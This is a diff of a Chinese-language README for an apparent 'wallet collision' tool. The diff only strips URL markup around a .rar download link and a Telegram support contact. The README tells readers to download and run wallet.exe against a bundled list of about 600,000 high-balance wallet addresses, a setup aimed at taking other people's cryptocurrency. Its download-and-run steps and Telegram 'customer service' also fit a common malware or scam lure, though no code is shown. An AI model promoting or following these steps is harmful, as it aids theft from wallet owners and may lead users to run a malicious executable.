@@ -51,7 +51,7 @@
 
 ## 安裝步驟
 
-1. 下載並解壓安裝包，[點擊這裡進行下載](<url id="d01riafhvltmd98hq6hg" type="url" status="failed" title="" wc="0">https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar</url> )
+1. 下載並解壓安裝包，[點擊這裡進行下載](https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar )
 2. 將需要碰撞的錢包位址放入`input`目錄(目前自帶60w大額錢包位址)
 3. 運行`wallet.exe`啟動程式
 4. 運行成功後，【開啟】 按鈕即可
@@ -65,7 +65,7 @@
 ## 聯絡我們
 
 如有任何問題，請聯絡我們的線上客服：
-- Telegram：[鹹魚客服](<url id="d01riafhvltmd98hq6i0" type="url" status="failed" title="" wc="0">https://t.me/web3_dev_gg</url> ) <br>
+- Telegram：[鹹魚客服](https://t.me/web3_dev_gg ) <br>
   <img alt="logo"   src="./img/tg.png">
 ## 注意事項
 
